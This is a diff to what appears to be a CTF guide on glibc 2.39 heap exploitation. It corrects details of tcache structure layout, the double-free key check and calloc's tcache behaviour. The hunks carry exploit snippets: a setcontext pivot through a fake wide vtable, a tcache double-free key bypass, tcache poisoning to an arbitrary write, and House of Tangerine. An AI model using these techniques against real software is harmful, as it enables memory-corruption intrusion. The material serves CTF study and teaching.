@@ -72,12 +72,12 @@ fake_wide_vtable = flat({
     0x68: p64(libc.sym.setcontext + 61),  # __doallocate → setcontext
 })
 
-# setcontext loads registers from the ucontext struct it is called with:
-#   glibc >= 2.29: ucontext pointer in RDI (fp->_wide_data when reached via
-#     _IO_wdoallocbuf) — RSP from [rdi+0xa0], RIP from [rdi+0xa8],
-#     RDI (first argument) from [rdi+0x68].
-#   glibc <= 2.28: registers were loaded relative to RDX instead
-#     (RSP from [rdx+0xa0], RIP from [rdx+0xa8], RDI from [rdx+0x68]).
+# setcontext loads registers from the ucontext struct: __setcontext does
+#   pushq %rdi / popq %rdx, so every load is relative to RDX in all
+#   versions (2.28 and 2.39 alike) — RSP from [rdx+0xa0],
+#   RIP from [rdx+0xa8], RDI (first argument) from [rdx+0x68].
+#   (fp->_wide_data reaches setcontext as RDI via _IO_wdoallocbuf, but the
+#   register loads inside __setcontext itself use RDX.)
 # Place ROP chain at _wide_data structure:
 fake_wide_data = flat({
     0x18: p64(0),                     # _IO_write_base = 0
@@ -627,19 +627,19 @@ typedef struct tcache_entry {
 } tcache_entry;
 
 typedef struct tcache_perthread_struct {
-    char    counts[TCACHE_MAX_BINS]; // +0x00: per-bin count (TCACHE_MAX_BINS=64)
-    tcache_entry *entries[TCACHE_MAX_BINS]; // +0x40: heads (mangled next)
+    uint16_t      counts[TCACHE_MAX_BINS];  // +0x00: per-bin counts, 64 x 2 bytes = 0x80 bytes
+    tcache_entry *entries[TCACHE_MAX_BINS]; // +0x80: heads (mangled next)
 } tcache_perthread_struct;
-// On 2.39, TCACHE_MAX_BINS=64, max count per bin = 7 (was 7 since 2.29, remains 7)
+// On 2.39, TCACHE_MAX_BINS=64, max count per bin = 7 (7 since 2.29, unchanged in 2.39)
 ```
 
-**What changed in 2.39:**
-- `key` moved to `+0x08` (was `+0x00` next field's key overlay in older? Actually since 2.32 `key` is at +0x08, but 2.39 hardens checks). Double-free detection compares `e->key == tcache_key` where `tcache_key` is a per-thread random value stored in `tcache_perthread_struct`.
-- `counts[]` is now a `char` array at offset 0x00 (previously `uint16_t`); max count enforced as 7 — freeing 8th chunk of same size goes to fastbin/unsorted, not tcache. **Count = 7 is the hard limit on glibc 2.39 Ubuntu 24.04.**
-- **`calloc` now uses tcache (since 2.39 / commit 5b82f6c):** previously `calloc` bypassed tcache and used `malloc`+`memset`. Now `calloc(n, size)` checks tcache first. This matters because `calloc` zero-fills, and it *does* trigger double-free key checks. Old `calloc` UAF tricks that assumed tcache bypass no longer work.
+**What 2.39 actually does (malloc/malloc.c, tag glibc-2.39):**
+- `key` at `+0x08` dates to 2.32, not 2.39. Double-free detection compares `e->key == tcache_key` in `_int_free` (malloc.c:4527) and walks the bin list to confirm before aborting. `tcache_key` is a process-wide `static uintptr_t` (malloc.c:3127-3128), seeded once from getrandom in `tcache_key_initialize` (malloc.c:3140-3152) — it is NOT per-thread and does NOT live in `tcache_perthread_struct`, so every thread shares the same key value.
+- `counts[]` is `uint16_t counts[TCACHE_MAX_BINS]` (malloc.c:3120): 64 entries x 2 bytes = 128 bytes, so `entries[]` starts at +0x80, not +0x40. Max count enforced as 7 — freeing an 8th chunk of the same size goes to fastbin/unsorted, not tcache. **Count = 7 is the hard limit on glibc 2.39 Ubuntu 24.04.**
+- **`calloc` bypasses tcache on 2.39:** `__libc_calloc` calls `_int_malloc` directly (malloc.c:3754) and never runs the tcache fast path, which lives only in `__libc_malloc` (malloc.c:3304-3327). `calloc` drawing from tcache is a glibc 2.41 change: `tcache_try_malloc` (defined malloc.c:3349, called from `__libc_calloc` at malloc.c:3795). On 2.39, `calloc` neither pops tcache chunks nor runs the key check.
 
 ```python
-# tcache 2.39: key at +0x08, count 7, calloc uses tcache
+# tcache 2.39: key at +0x08 (process-wide), counts uint16_t, entries at +0x80, count 7, calloc bypasses tcache
 
 # Double-free detection (tcache_put):
 #   e->key = tcache_key;
@@ -676,13 +676,15 @@ edit(q, payload)
 # 3. Free again — now e->key != tcache_key, so second free succeeds (no abort)
 free(q)  # bypassed!
 
-# 4. Alternative: use calloc to bypass stale key
-#    Since calloc now uses tcache, it also pops and checks key, but zero-fills.
-#    If you cannot edit key, allocate with different size then re-free:
+# 4. calloc is tcache-neutral on 2.39, tcache-aware on 2.41+:
+#    On 2.39 calloc never pops tcache, so it cannot clear a stale key and a
+#    double-free still aborts on the key check — use calloc as grooming that
+#    leaves counts[] and keys untouched:
 free(p)  # after bypass, chunk is in tcache again with fresh key
-r = calloc(1, 0x40)  # 2.39: calloc pulls from same tcache bin → key overwritten with 0s via memset
-free(r)
-free(r)  # double-free via calloc zeroing — key is now 0
+r = calloc(1, 0x40)  # 2.39: fresh chunk via _int_malloc, tcache state unchanged
+#    On 2.41+ calloc pops from tcache and zero-fills: if it reuses a chunk you
+#    still hold a dangling pointer to, the in-memory key field is cleared to 0,
+#    so a stale free passes the e->key != tcache_key fast check.
 
 # 5. Classic tcache poisoning after bypass:
 #    Free -> edit fd (mangled) -> malloc -> malloc returns target
@@ -695,13 +697,13 @@ malloc(0x40)  # returns target → arbitrary write
 **Key takeaways for CTF (2024+):**
 - Always consider `key at +0x08` when crafting fake tcache chunks — zero it or set to non-key value before second free.
 - Count 7: after 7 frees of same size, the 8th free leaks to unsorted/fastbin — useful to force largebin path (see Largebin Attack).
-- `calloc` no longer escapes tcache: if the challenge uses `calloc` for allocations, tcache poisoning still works, but you must account for the implicit `memset(0)` clobbering the next/key fields.
+- `calloc` bypasses tcache on 2.39 (through 2.40): challenge allocations via `calloc` never touch tcache state, which makes calloc handy for grooming without disturbing counts/keys. Starting with 2.41, `calloc` shares the tcache path (`tcache_try_malloc`), so tcache poisoning works through `calloc` too — but you must account for the implicit `memset(0)` clobbering the next/key fields.
 
 ---
 
 ## House of Tangerine — tcache Count + Unsorted Bin Variant
 
-**When to use:** glibc 2.39 (Ubuntu 24.04) where tcache count is 7 and `calloc` uses tcache. House of Tangerine bridges tcache and unsorted bin to get arbitrary write without a direct overflow into `fd`.
+**When to use:** glibc 2.39 (Ubuntu 24.04) where tcache count is 7 and `calloc` bypasses tcache (`__libc_calloc` goes straight to `_int_malloc`). House of Tangerine bridges tcache and unsorted bin to get arbitrary write without a direct overflow into `fd`.
 
 **Vulnerability requirements:** UAF or off-by-one that can corrupt the `counts[]` byte or leak heap, plus ability to allocate large chunks.
 
@@ -738,7 +740,7 @@ malloc(0x40)
 pwn = malloc(0x40)  # == target → arbitrary write (e.g., __free_hook / _IO_list_all)
 ```
 
-**Why 2.39 matters:** Before 2.39, `calloc` bypassed tcache, so House of Tangerine's `count` corruption could be stabilized with `calloc` allocations that didn't affect counts. On 2.39, `calloc` decrements the same `counts[]` byte, so the attacker must account for it or use `count 7` saturation to force unsorted bin path explicitly.
+**Why 2.39 matters:** On 2.39, `calloc` bypasses tcache, so House of Tangerine's `count` corruption can be stabilized with `calloc` allocations that don't affect counts. On 2.41+, `calloc` shares the tcache path and decrements the same `counts[]` entry, so the attacker must account for it or use `count 7` saturation to force the unsorted bin path explicitly.
 
 **References:** House of Tangerine — 2024 CTF, glibc 2.39 adaptation of House of Muney / tcache stash.
 
